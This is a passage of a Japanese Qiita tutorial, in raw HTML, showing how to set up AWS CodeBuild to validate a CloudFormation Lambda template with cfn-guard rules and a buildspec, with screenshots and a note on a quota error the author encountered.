href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F192949%2F59ec8bcf-4bfc-44dd-8f9b-9673187ab253.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=20ebf0e8abf93dedec4710a5d79af0f3\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F192949%2F59ec8bcf-4bfc-44dd-8f9b-9673187ab253.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=20ebf0e8abf93dedec4710a5d79af0f3\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F192949%2F59ec8bcf-4bfc-44dd-8f9b-9673187ab253.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=32f512f4e106a34376475348fe92d29c 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/192949/59ec8bcf-4bfc-44dd-8f9b-9673187ab253.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"36:1-36:108\">プロジェクト名を入力し、今回はデフォルトプロジェクトの設定を選択します。</p>\n<p data-sourcepos=\"38:1-38:121\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F192949%2F47819cb0-653e-4fbd-9da2-298822505fe1.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=8f9c3f78d25a136cef18757f109cfaf1\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F192949%2F47819cb0-653e-4fbd-9da2-298822505fe1.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=8f9c3f78d25a136cef18757f109cfaf1\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F192949%2F47819cb0-653e-4fbd-9da2-298822505fe1.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=0b4e76529361518dbd99782d8a40c490 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/192949/47819cb0-653e-4fbd-9da2-298822505fe1.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"41:1-41:94\">ソースプロバイダは前回作成したAWSCodeCommitリポジトリを使用します。</p>\n<p data-sourcepos=\"43:1-43:121\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F192949%2Fd2ff993e-c05b-48eb-bb81-f30b90761ddf.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=876eeda367cd6249cf23e4f4c22d065e\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F192949%2Fd2ff993e-c05b-48eb-bb81-f30b90761ddf.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=876eeda367cd6249cf23e4f4c22d065e\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F192949%2Fd2ff993e-c05b-48eb-bb81-f30b90761ddf.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=4233c30251a32b217a78adb769761d98 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/192949/d2ff993e-c05b-48eb-bb81-f30b90761ddf.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"46:1-46:186\">今回は最小限の設定でプロジェクトを作成したいため、環境イメージはマネージド型イメージ、コンピューティングはLambdaを選択します。</p>\n<p data-sourcepos=\"48:1-48:121\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F192949%2Fc1af0e13-75ee-420d-baaa-a82955c1883e.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=ea29cff834be4e5a90db4382e668d9ae\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F192949%2Fc1af0e13-75ee-420d-baaa-a82955c1883e.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=ea29cff834be4e5a90db4382e668d9ae\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F192949%2Fc1af0e13-75ee-420d-baaa-a82955c1883e.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=7c3db73fcf48dfb902d2799d950ccb8d 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/192949/c1af0e13-75ee-420d-baaa-a82955c1883e.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"50:1-50:121\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F192949%2F017d3786-d205-4316-9971-3071adca9a12.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=9d45143d771bc10df86241e30fa00ae5\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F192949%2F017d3786-d205-4316-9971-3071adca9a12.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=9d45143d771bc10df86241e30fa00ae5\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F192949%2F017d3786-d205-4316-9971-3071adca9a12.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=3b8b937117b43e0cf53675258ed01ba4 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/192949/017d3786-d205-4316-9971-3071adca9a12.png\" loading=\"lazy\"></a></p>\n<p data-sourcepos=\"52:1-53:121\">AWSCodeCommitのリポジトリで管理しているbuildspecファイルに従ってビルドを実行するため、「builspecファイルを使用する」を選択します<br>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F192949%2F0a6b5518-6f04-4648-8e5c-73b04e896b73.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=4e1dbd71e49c6b8c38320f94ba412efd\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F192949%2F0a6b5518-6f04-4648-8e5c-73b04e896b73.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=4e1dbd71e49c6b8c38320f94ba412efd\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F192949%2F0a6b5518-6f04-4648-8e5c-73b04e896b73.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=1356c9f7d48ea594d55f9a61537022ff 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/192949/0a6b5518-6f04-4648-8e5c-73b04e896b73.png\" loading=\"lazy\"></a></p>\n<h1 data-sourcepos=\"56:1-56:29\">\n<span id=\"テスト対象物の作成\" class=\"fragment\"></span><a href=\"#%E3%83%86%E3%82%B9%E3%83%88%E5%AF%BE%E8%B1%A1%E7%89%A9%E3%81%AE%E4%BD%9C%E6%88%90\"><i class=\"fa fa-link\"></i></a>テスト対象物の作成</h1>\n<p data-sourcepos=\"57:1-57:238\">今回はCloudFormationテンプレートに対してCfn-guardのテストを行うようにしたいので、CloudFormationテンプレートとCfn-guardのルールファイル、CodeBuild用のBuildSpecファイルを作成します。</p>\n<h2 data-sourcepos=\"59:1-59:35\">\n<span id=\"cloudformationテンプレート\" class=\"fragment\"></span><a href=\"#cloudformation%E3%83%86%E3%83%B3%E3%83%97%E3%83%AC%E3%83%BC%E3%83%88\"><i class=\"fa fa-link\"></i></a>CloudFormationテンプレート</h2>\n<p data-sourcepos=\"60:1-61:60\">今回はLambda関数の定義のみを定義しておきます<br>\nこのLambda関数は以下の定義が行われています</p>\n<ul data-sourcepos=\"62:1-64:48\">\n<li data-sourcepos=\"62:1-62:37\">タイムアウト設定： 30(秒)</li>\n<li data-sourcepos=\"63:1-63:45\">ランタイムバージョン： python3.9</li>\n<li data-sourcepos=\"64:1-64:48\">ポリシーは： AWSLambdaBasicExecutionRole</li>\n</ul>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"65:1-103:4\"><div class=\"highlight\"><pre><code>AWSTemplateFormatVersion: '2010-09-09'\nDescription: 'Lambda function CloudFormation template'\n\nResources:\n  MyLambdaFunction:\n    Type: AWS::Lambda::Function\n    Properties:\n      FunctionName: MyLambdaFunction\n      Runtime: python3.9\n      Handler: index.lambda_handler\n      Role: !GetAtt LambdaExecutionRole.Arn\n      Timeout: 30\n      Code:\n        ZipFile: |\n          def lambda_handler(event, context):\n              return {\n                  'statusCode': 200,\n                  'body': 'Hello from Lambda!'\n              }\n\n  LambdaExecutionRole:\n    Type: AWS::IAM::Role\n    Properties:\n      AssumeRolePolicyDocument:\n        Version: '2012-10-17'\n        Statement:\n          - Effect: Allow\n            Principal:\n              Service: lambda.amazonaws.com\n            Action: sts:AssumeRole\n      ManagedPolicyArns:\n        - arn:aws:iam::aws:policy/service-role/AWSLambdaBasicExecutionRole\n\nOutputs:\n  LambdaFunctionArn:\n    Description: 'Lambda Function ARN'\n    Value: !GetAtt MyLambdaFunction.Arn\n</code></pre></div></div>\n<h2 data-sourcepos=\"106:1-106:34\">\n<span id=\"cfn-guard-ルールファイル\" class=\"fragment\"></span><a href=\"#cfn-guard-%E3%83%AB%E3%83%BC%E3%83%AB%E3%83%95%E3%82%A1%E3%82%A4%E3%83%AB\"><i class=\"fa fa-link\"></i></a>Cfn-guard ルールファイル</h2>\n<p data-sourcepos=\"107:1-107:105\">今回はLambda関数について、以下の定義になっていることをチェックしています</p>\n<ul data-sourcepos=\"108:1-111:0\">\n<li data-sourcepos=\"108:1-108:41\">タイムアウト設定：900秒以下</li>\n<li data-sourcepos=\"109:1-109:117\">ランタイムバージョン：\"python3.9\", \"python3.10\", \"python3.11\", \"nodejs18.x\", \"nodejs20.x\"のいずれか</li>\n<li data-sourcepos=\"110:1-111:0\">ポリシー：PowerUserAccess、AdministratorAccessなど過度に強いポリシーが設定されていない</li>\n</ul>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"112:1-138:3\"><div class=\"highlight\"><pre><code># Lambda function security and best practices rules\n\n# Ensure Lambda function has a timeout set\nrule lambda_timeout_check {\n    Resources.*[ Type == \"AWS::Lambda::Function\" ] {\n        Properties.Timeout exists\n        Properties.Timeout &lt;= 900\n    }\n}\n\n# Ensure Lambda function uses supported runtime\nrule lambda_runtime_check {\n    Resources.*[ Type == \"AWS::Lambda::Function\" ] {\n        Properties.Runtime in [\"python3.9\", \"python3.10\", \"python3.11\", \"nodejs18.x\", \"nodejs20.x\"]\n    }\n}\n\n# Ensure IAM role follows least privilege\nrule iam_role_managed_policy_check {\n    Resources.*[ Type == \"AWS::IAM::Role\" ] {\n        Properties.ManagedPolicyArns exists\n        Properties.ManagedPolicyArns.* != \"arn:aws:iam::aws:policy/PowerUserAccess\"\n        Properties.ManagedPolicyArns.* != \"arn:aws:iam::aws:policy/AdministratorAccess\"\n    }\n}\n</code></pre></div></div>\n<h2 data-sourcepos=\"140:1-140:12\">\n<span id=\"buildspec\" class=\"fragment\"></span><a href=\"#buildspec\"><i class=\"fa fa-link\"></i></a>BuildSpec</h2>\n<p data-sourcepos=\"141:1-142:48\">ビルドスペックではCodeBuildの実行内容を定義しています。<br>\n今回は以下の定義を行っています。</p>\n<h3 data-sourcepos=\"143:1-143:47\">\n<span id=\"installインストールフェーズ\" class=\"fragment\"></span><a href=\"#install%E3%82%A4%E3%83%B3%E3%82%B9%E3%83%88%E3%83%BC%E3%83%AB%E3%83%95%E3%82%A7%E3%83%BC%E3%82%BA\"><i class=\"fa fa-link\"></i></a>install（インストールフェーズ）</h3>\n<ul data-sourcepos=\"144:1-146:33\">\n<li data-sourcepos=\"144:1-144:84\">Rust をインストール(CloudFormation Guard は Rust で書かれています)</li>\n<li data-sourcepos=\"145:1-145:78\">Cargo（Rust のパッケージマネージャー）の環境変数を設定</li>\n<li data-sourcepos=\"146:1-146:33\">cfn-guard をインストール</li>\n</ul>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"147:1-155:3\"><div class=\"highlight\"><pre><code>phases:\n  install:\n    runtime-versions:\n      rust: 1.70\n    commands:\n      - echo \"Installing CloudFormation Guard...\"\n      - cargo install cfn-guard\n</code></pre></div></div>\n<h3 data-sourcepos=\"158:1-158:43\">\n<span id=\"pre_buildビルド前フェーズ\" class=\"fragment\"></span><a href=\"#pre_build%E3%83%93%E3%83%AB%E3%83%89%E5%89%8D%E3%83%95%E3%82%A7%E3%83%BC%E3%82%BA\"><i class=\"fa fa-link\"></i></a>pre_build（ビルド前フェーズ）</h3>\n<ul data-sourcepos=\"159:3-161:51\">\n<li data-sourcepos=\"159:3-159:25\">開始時刻を出力</li>\n<li data-sourcepos=\"160:3-161:51\">cfn-guard のバージョンを確認\n<ul data-sourcepos=\"161:5-161:51\">\n<li data-sourcepos=\"161:5-161:51\">正しくインストールされたか検証</li>\n</ul>\n</li>\n</ul>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"162:1-167:3\"><div class=\"highlight\"><pre><code>  pre_build:\n    commands:\n      - echo \"Pre-build phase started on `date`\"\n      - cfn-guard --version\n</code></pre></div></div>\n<h3 data-sourcepos=\"169:1-169:36\">\n<span id=\"buildビルドフェーズ\" class=\"fragment\"></span><a href=\"#build%E3%83%93%E3%83%AB%E3%83%89%E3%83%95%E3%82%A7%E3%83%BC%E3%82%BA\"><i class=\"fa fa-link\"></i></a>build（ビルドフェーズ）</h3>\n<ul data-sourcepos=\"170:1-173:0\">\n<li data-sourcepos=\"170:1-170:41\">CloudFormation Guard の検証を実行</li>\n<li data-sourcepos=\"171:1-171:76\">lambda-rules.guard のルールを使って lambda-template.yaml を検証</li>\n<li data-sourcepos=\"172:1-173:0\">--show-summary all で詳細なサマリーを表示</li>\n</ul>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"174:1-180:3\"><div class=\"highlight\"><pre><code>  build:\n    commands:\n      - echo \"Build phase started on `date`\"\n      - echo \"Running CloudFormation Guard validation...\"\n      - cfn-guard validate --rules lambda-rules.guard --data lambda-template.yaml --show-summary all\n</code></pre></div></div>\n<h3 data-sourcepos=\"182:1-182:44\">\n<span id=\"post_buildビルド後フェーズ\" class=\"fragment\"></span><a href=\"#post_build%E3%83%93%E3%83%AB%E3%83%89%E5%BE%8C%E3%83%95%E3%82%A7%E3%83%BC%E3%82%BA\"><i class=\"fa fa-link\"></i></a>post_build（ビルド後フェーズ）</h3>\n<ul data-sourcepos=\"183:1-184:0\">\n<li data-sourcepos=\"183:1-184:0\">完了時刻と完了メッセージを出力</li>\n</ul>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"185:1-190:3\"><div class=\"highlight\"><pre><code>  post_build:\n    commands:\n      - echo \"Post-build phase completed on `date`\"\n      - echo \"CloudFormation Guard validation completed\"\n</code></pre></div></div>\n<h3 data-sourcepos=\"191:1-191:27\">\n<span id=\"reports-セクション\" class=\"fragment\"></span><a href=\"#reports-%E3%82%BB%E3%82%AF%E3%82%B7%E3%83%A7%E3%83%B3\"><i class=\"fa fa-link\"></i></a>reports セクション</h3>\n<ul data-sourcepos=\"192:1-195:0\">\n<li data-sourcepos=\"192:1-192:58\">cfn-guard-report という名前でレポートを生成</li>\n<li data-sourcepos=\"193:1-193:71\">カレントディレクトリのすべてのファイルを含める</li>\n<li data-sourcepos=\"194:1-195:0\">パス構造を保持</li>\n</ul>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"196:1-203:3\"><div class=\"highlight\"><pre><code>reports:\n  cfn-guard-report:\n    files:\n      - '**/*'\n    base-directory: '.'\n    discard-paths: no\n</code></pre></div></div>\n<h2 data-sourcepos=\"206:1-206:27\">\n<span id=\"リポジトリの内容\" class=\"fragment\"></span><a href=\"#%E3%83%AA%E3%83%9D%E3%82%B8%E3%83%88%E3%83%AA%E3%81%AE%E5%86%85%E5%AE%B9\"><i class=\"fa fa-link\"></i></a>リポジトリの内容</h2>\n<p data-sourcepos=\"207:1-207:184\">フォルダ分けしてテンプレートとルールファイルを分けるなどを行ってもよいですが、今回は同じ階層に3つのファイルを配置しました。</p>\n<p data-sourcepos=\"209:1-209:121\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F192949%2Fe733a68e-ae7a-421b-b6b0-3234b27a5b27.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=869a8a23423afc0d928f29b7ec4c68ee\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F192949%2Fe733a68e-ae7a-421b-b6b0-3234b27a5b27.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=869a8a23423afc0d928f29b7ec4c68ee\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F192949%2Fe733a68e-ae7a-421b-b6b0-3234b27a5b27.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=3bfebffb6c32f59b733ba5e21b03f012 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/192949/e733a68e-ae7a-421b-b6b0-3234b27a5b27.png\" loading=\"lazy\"></a></p>\n<h1 data-sourcepos=\"214:1-214:20\">\n<span id=\"ビルドを実行\" class=\"fragment\"></span><a href=\"#%E3%83%93%E3%83%AB%E3%83%89%E3%82%92%E5%AE%9F%E8%A1%8C\"><i class=\"fa fa-link\"></i></a>ビルドを実行</h1>\n<p data-sourcepos=\"215:1-215:69\">「ビルドを開始」ボタンからビルドを実行します。</p>\n<p data-sourcepos=\"217:1-217:121\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F192949%2F265c804d-d8c0-49cd-b90c-d2539d7cf279.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=b52219865f625c3e4c538a23478d98de\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F192949%2F265c804d-d8c0-49cd-b90c-d2539d7cf279.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=b52219865f625c3e4c538a23478d98de\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F192949%2F265c804d-d8c0-49cd-b90c-d2539d7cf279.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=df149800640cd893ee7a66a9b2c932bd 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/192949/265c804d-d8c0-49cd-b90c-d2539d7cf279.png\" loading=\"lazy\"></a></p>\n<div data-sourcepos=\"220:1-227:3\" class=\"note warn\">\n<span class=\"fa fa-fw fa-exclamation-circle\"></span><div>\n<p data-sourcepos=\"221:1-223:80\">実行時エラーが発生<br>\n私の環境ではクォータに関するエラーが発生しました<br>\nAWSサポートに連絡し、数日経つと解決しました(原因は不明)</p>\n<div class=\"code-frame\" data-lang=\"text\" data-sourcepos=\"224:1-226:3\"><div class=\"highlight\"><pre><code>Cannot have more than 0 concurrent builds on LINUX_LAMBDA_CONTAINER machines with the BUILD_LAMBDA_2GB compute type for the account\n</code></pre></div></div>\n</div>\n</div>\n<h3 data-sourcepos=\"230:1-230:22\">\n<span id=\"ビルドの履歴\" class=\"fragment\"></span><a href=\"#%E3%83%93%E3%83%AB%E3%83%89%E3%81%AE%E5%B1%A5%E6%AD%B4\"><i class=\"fa fa-link\"></i></a>ビルドの履歴</h3>\n<p data-sourcepos=\"231:1-231:141\">ビルドの状況は「ビルド履歴」に表示される「進行中」「成功」「失敗」のステータスで確認できます。</p>\n<p data-sourcepos=\"233:1-233:121\"><a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F192949%2Fa01099aa-e2f6-4507-a0f5-24666c21e289.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=e94bb066b1963889744b75cce5468116\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F192949%2Fa01099aa-e2f6-4507-a0f5-24666c21e289.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=e94bb066b1963889744b75cce5468116\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F192949%2Fa01099aa-e2f6-4507-a0f5-24666c21e289.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=eff3a38d2815a9330ea5e67063837a54 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/192949/a01099aa-e2f6-4507-a0f5-24666c21e289.png\" loading=\"lazy\"></a></p>\n<h3 data-sourcepos=\"235:1-235:19\">\n<span id=\"ビルドログ\" class=\"fragment\"></span><a href=\"#%E3%83%93%E3%83%AB%E3%83%89%E3%83%AD%E3%82%B0\"><i class=\"fa fa-link\"></i></a>ビルドログ</h3>\n<p data-sourcepos=\"236:1-236:69\">ビルド履歴の詳細ではビルドログが確認できます。</p>\n<p data-sourcepos=\"238:1-240:121\">↓　ビルドログでCfn-guardのチェックがPASSしていることが確認できます。<br>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F192949%2Fe8de58b1-16c7-4e9d-8336-1588ad886a0c.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=fb450007c175ea89123812827fba4e2d\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F192949%2Fe8de58b1-16c7-4e9d-8336-1588ad886a0c.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=fb450007c175ea89123812827fba4e2d\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F192949%2Fe8de58b1-16c7-4e9d-8336-1588ad886a0c.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=95ce630efe9a7632578737167ee1160c 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/192949/e8de58b1-16c7-4e9d-8336-1588ad886a0c.png\" loading=\"lazy\"></a><br>\n<a href=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F192949%2F20e95d83-5859-4e85-a59e-46bd29c226b5.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=80f3af37076ea63c84729bc1a47dd75a\" target=\"_blank\" rel=\"nofollow noopener\"><img src=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F192949%2F20e95d83-5859-4e85-a59e-46bd29c226b5.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;s=80f3af37076ea63c84729bc1a47dd75a\" alt=\"image.png\" srcset=\"https://qiita-user-contents.imgix.net/https%3A%2F%2Fqiita-image-store.s3.ap-northeast-1.amazonaws.com%2F0%2F192949%2F20e95d83-5859-4e85-a59e-46bd29c226b5.png?ixlib=rb-4.0.0&amp;auto=format&amp;gif-q=60&amp;q=75&amp;w=1400&amp;fit=max&amp;s=388306d335ac54f62bf0578eb74449d8 1x\" data-canonical-src=\"https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/192949/20e95d83-5859-4e85-a59e-46bd29c226b5.png\" loading=\"lazy\"></a></p>\n<h1 data-sourcepos=\"244:1-244:14\">\n<span id=\"さいごに\" class=\"fragment\"></span><a href=\"#%E3%81%95%E3%81%84%E3%81%94%E3%81%AB\"><i class=\"fa fa-link\"></i></a>さいごに</h1>\n<p data-sourcepos=\"245:1-247:266\">今回の記事ではAWS CodeBuildを紹介しました。<br>\nAWSCodeCommitで管理されているアセットに対してあらかじめ設定したテストを自動でテストできるので、デプロイ前の自動テストに有効です。<br>\nAWSCodeCommit内のアセットの変更に連動してAWSCodeBUildでテストをして、場合によってはAWSCodeDeployによるデプロイを自動化するパイプラインの構成も実現できますが、それはまた別の記事で紹介します。</p>\n<h1 data-sourcepos=\"250:1-250:8\">\n<span id=\"参考\" class=\"fragment\"></span><a href=\"#%E5%8F%82%E8%80%83\"><i class=\"fa fa-link\"></i></a>参考</h1>\n<p data-sourcepos=\"253:1-253:45\">↓ AWS CodeBuild の公式ドキュメント</p>\n<p data-sourcepos=\"255:1-255:80\"><iframe id=\"qiita-embed-content__9ea539b16aca1206063b9ca9c31ecc77\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__9ea539b16aca1206063b9ca9c31ecc77\" data-content=\"https%3A%2F%2Fdocs.aws.amazon.com%2Fja_jp%2Fcodebuild%2Flatest%2Fuserguide%2Fbuilds-working.html\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"257:1-257:47\">↓ AWS CodeBuild のBlackBelt資料(日本語)</p>\n<p data-sourcepos=\"259:1-259:89\"><iframe id=\"qiita-embed-content__7af26ccd04bc3c857d2de0631e42c7dc\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__7af26ccd04bc3c857d2de0631e42c7dc\" data-content=\"https%3A%2F%2Fpages.awscloud.com%2Frs%2F112-TZM-766%2Fimages%2F20201125_AWS_BlackBelt_AWS_CodeBuild.pdf\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<h1 data-sourcepos=\"261:1-261:23\">\n<span id=\"過去の関連記事\" class=\"fragment\"></span><a href=\"#%E9%81%8E%E5%8E%BB%E3%81%AE%E9%96%A2%E9%80%A3%E8%A8%98%E4%BA%8B\"><i class=\"fa fa-link\"></i></a>過去の関連記事</h1>\n<p data-sourcepos=\"263:1-263:18\">↓ AWS CodeCommit</p>\n<p data-sourcepos=\"265:1-265:53\"><iframe id=\"qiita-embed-content__a50760f16d3de195dda58eded997de55\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__a50760f16d3de195dda58eded997de55\" data-content=\"https%3A%2F%2Fqiita.com%2FNana_777%2Fitems%2Fa8be2eee9ee9d81326cb\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n<p data-sourcepos=\"267:1-267:18\">↓ AWS CodeDeploy</p>\n<p data-sourcepos=\"269:1-269:53\"><iframe id=\"qiita-embed-content__89e3bf756183a4c9d54c2bdfdb1fc1e5\" src=\"https://qiita.com/embed-contents/link-card#qiita-embed-content__89e3bf756183a4c9d54c2bdfdb1fc1e5\" data-content=\"https%3A%2F%2Fqiita.com%2FNana_777%2Fitems%2F7639c02a19b0553b3e56\" frameborder=\"0\" scrolling=\"no\" loading=\"lazy\" style=\"width:100%;\" height=\"29\">\n</iframe>\n</p>\n",
